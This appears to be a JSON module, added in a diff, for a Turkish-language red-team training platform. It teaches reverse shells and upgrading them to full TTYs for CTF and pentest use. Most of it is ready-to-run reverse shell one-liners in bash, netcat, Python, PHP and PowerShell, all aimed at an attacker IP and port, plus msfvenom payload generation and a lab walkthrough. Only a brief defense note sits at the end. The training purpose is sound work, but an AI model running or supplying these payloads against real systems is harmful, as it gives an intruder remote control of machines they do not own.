@@ -1,0 +1,168 @@
+{
+  "id": "reverse-shells",
+  "slug": "reverse-shells",
+  "title": "Reverse Shell & Shell Yükseltme",
+  "subtitle": "Erişim Kazanma ve Stabil Shell",
+  "description": "Hedefte kod çalıştırma elde ettikten sonra geri bağlantı (reverse shell) almanın tüm yöntemleri ve sınırlı shell'i tam etkileşimli TTY'ye yükseltme — her CTF ve pentest'in temel adımı.",
+  "team": "red-team",
+  "category": "Shell & Erişim",
+  "phase": "Exploitation",
+  "icon": "🐚",
+  "color": "#ef4444",
+  "tags": ["reverse shell", "bind shell", "tty", "netcat", "bash", "powershell", "msfvenom"],
+  "modules": [
+    {
+      "id": "basics",
+      "title": "Reverse Shell Temelleri",
+      "description": "Reverse vs bind shell, dinleyici açma ve temel payload'lar",
+      "difficulty": "beginner",
+      "duration": "20 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "Reverse Shell Mantığı",
+          "content": "**Reverse Shell:** Hedef makine SANA geri bağlanır. Saldırgan dinler, hedef bağlantıyı başlatır. Firewall'lar genelde giden bağlantıya izin verdiği için tercih edilir.\n\n**Bind Shell:** Hedef bir port açar, saldırgan ona bağlanır. Hedef firewall'ı genelde gelen bağlantıyı engellediği için daha az kullanılır.\n\n**Akış:**\n```\n1. Saldırgan dinleyici açar:  nc -lvnp 4444\n2. Hedefte payload çalışır:    bash -i >& /dev/tcp/SALDIRGAN/4444 0>&1\n3. Shell saldırgana düşer\n```\n\n**LHOST/LPORT:**\n- **LHOST** = senin IP'n (VPN'de tun0 → `ip addr show tun0`)\n- **LPORT** = dinlediğin port (4444, 443, 80 — firewall'dan geçmesi için yaygın portlar iyidir)\n\n**CTF ipucu:** Bir RCE (komut çalıştırma) bulunca ilk hedef stabil bir reverse shell almaktır. Hangi dilin yüklü olduğunu (bash, python, php, nc) tespit et ve uygun payload'ı seç."
+        },
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "Dinleyici ve Temel Shell'ler",
+          "commands": [
+            {
+              "command": "nc -lvnp 4444",
+              "description": "Netcat dinleyici aç — gelen reverse shell'i yakala",
+              "output": "listening on [any] 4444 ...",
+              "tip": "Daha iyisi: rlwrap nc -lvnp 4444 (ok tuşları ve geçmiş çalışır). -l dinle, -v ayrıntı, -n DNS yok, -p port.",
+              "flags": [
+                { "flag": "-l", "description": "Dinleme modu" },
+                { "flag": "-v", "description": "Ayrıntılı çıktı" },
+                { "flag": "-n", "description": "DNS çözümleme yok" },
+                { "flag": "-p", "description": "Port" }
+              ]
+            },
+            {
+              "command": "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1",
+              "description": "Bash reverse shell — Linux hedeflerde en yaygın",
+              "tip": "10.10.14.1 yerine kendi IP'ni yaz. /dev/tcp bash'in özelliğidir, ayrı araç gerekmez."
+            },
+            {
+              "command": "nc -e /bin/sh 10.10.14.1 4444",
+              "description": "Netcat reverse shell (-e destekliyorsa)",
+              "tip": "-e birçok modern nc sürümünde yoktur. Alternatif: mkfifo tabanlı netcat shell."
+            },
+            {
+              "command": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.14.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+              "description": "Python reverse shell — Python yüklüyse güvenilir",
+              "tip": "Python neredeyse her Linux'ta vardır. nc -e çalışmadığında ideal alternatif."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "platform-shells",
+      "title": "Platform Bazlı Shell'ler & msfvenom",
+      "description": "PHP, PowerShell, Windows shell'leri ve payload üretimi",
+      "difficulty": "intermediate",
+      "duration": "20 dk",
+      "sections": [
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "Çeşitli Payload'lar",
+          "commands": [
+            {
+              "command": "php -r '$sock=fsockopen(\"10.10.14.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+              "description": "PHP reverse shell — web sunucularında (RCE/upload)",
+              "tip": "Web shell veya dosya yükleme zafiyetinde kullanılır. pentestmonkey php-reverse-shell de yaygındır."
+            },
+            {
+              "command": "powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('10.10.14.1',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()}\"",
+              "description": "PowerShell reverse shell — Windows hedeflerde",
+              "tip": "Nishang Invoke-PowerShellTcp daha pratik. -nop = NoProfile, -c = komut."
+            },
+            {
+              "command": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f elf -o shell.elf",
+              "description": "msfvenom ile Linux ELF reverse shell payload üret",
+              "tip": "Windows için: -p windows/x64/shell_reverse_tcp -f exe. PHP/ASP/raw da desteklenir.",
+              "flags": [
+                { "flag": "-p", "description": "Payload türü" },
+                { "flag": "-f", "description": "Format (elf, exe, php, raw, asp)" },
+                { "flag": "LHOST/LPORT", "description": "Geri bağlantı adresi" }
+              ]
+            },
+            {
+              "command": "# Hızlı referans için: https://www.revshells.com (online reverse shell üretici)",
+              "description": "revshells.com — IP/port gir, istediğin dilde payload üret",
+              "tip": "CTF'de en hızlı yol: revshells.com'dan IP/port ile hazır payload kopyala."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "tty-upgrade",
+      "title": "TTY Yükseltme (Stabil Shell) + Lab",
+      "description": "Sınırlı shell'i tam etkileşimli TTY'ye çevirme",
+      "difficulty": "intermediate",
+      "duration": "20 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "Neden TTY Yükseltme?",
+          "content": "İlk reverse shell genelde **dumb shell**'dir: Ctrl+C bağlantıyı koparır, sekme tamamlama yok, sudo/su çalışmaz, nano/vim açılmaz.\n\n**Tam TTY ile kazandıkların:**\n- Ctrl+C shell'i öldürmez\n- Sekme tamamlama (tab completion)\n- Komut geçmişi (ok tuşları)\n- sudo, su, ssh, nano, vim çalışır\n- Ekran boyutu doğru\n\nBu, privesc ve genel çalışma için kritiktir."
+        },
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "TTY Yükseltme Adımları",
+          "commands": [
+            {
+              "command": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
+              "description": "1. Adım: PTY ile yarı-etkileşimli bash al",
+              "tip": "Python yoksa: script -qc /bin/bash /dev/null dene."
+            },
+            {
+              "command": "# Shell'de:\nexport TERM=xterm\n# Ctrl+Z (arka plana al)\n# Yerel makinede:\nstty raw -echo; fg\n# Enter Enter",
+              "description": "2. Adım: Tam etkileşimli TTY (Ctrl+Z → stty → fg)",
+              "tip": "stty raw -echo terminal kontrolünü shell'e verir. fg ile geri getir. Artık Ctrl+C güvenli.",
+              "warning": "Adımların sırası önemli: önce Ctrl+Z, sonra yerelde stty raw -echo; fg, sonra Enter."
+            },
+            {
+              "command": "stty rows 38 columns 116",
+              "description": "3. Adım: Ekran boyutunu ayarla (nano/vim için)",
+              "tip": "Kendi terminalinin boyutunu öğren: yerelde stty -a"
+            }
+          ]
+        },
+        {
+          "id": "lab",
+          "type": "lab",
+          "title": "CTF Senaryosu: RCE'den Stabil Shell'e",
+          "scenario": {
+            "title": "Reverse Shell Al ve TTY'ye Yükselt",
+            "objective": "Bir web zafiyetinden komut çalıştırma elde et, reverse shell al ve tam etkileşimli TTY'ye yükselterek privesc'e hazır hale gel.",
+            "environment": "TryHackMe/HTB web makinesi (RCE veya dosya yükleme)",
+            "difficulty": "beginner",
+            "steps": [
+              "Dinleyici aç: nc -lvnp 4444",
+              "Hedefte payload çalıştır (revshells.com'dan dile uygun seç)",
+              "Shell düştüğünde: python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
+              "export TERM=xterm",
+              "Ctrl+Z → stty raw -echo; fg → Enter Enter",
+              "id ve sudo -l çalıştırarak privesc'e başla (LinPEAS)"
+            ],
+            "hints": [
+              "Payload çalışmıyorsa: hedefte hangi dil yüklü? (which python3, php -v)",
+              "nc -e yoksa python/bash /dev/tcp yöntemini kullan",
+              "TTY yükseltmeden sonra ekran boyutunu ayarlamayı unutma"
+            ],
+            "defenseNote": "Savunma: Giden (egress) trafiği filtrele, yalnızca gerekli portlara izin ver, uygulama beyaz listesi (AppLocker/WDAC), EDR ile anormal süreç-ağ davranışını tespit et ve web uygulamalarında komut çalıştırmayı engelle."
+          }
+        }
+      ]
+    }
+  ]
+}
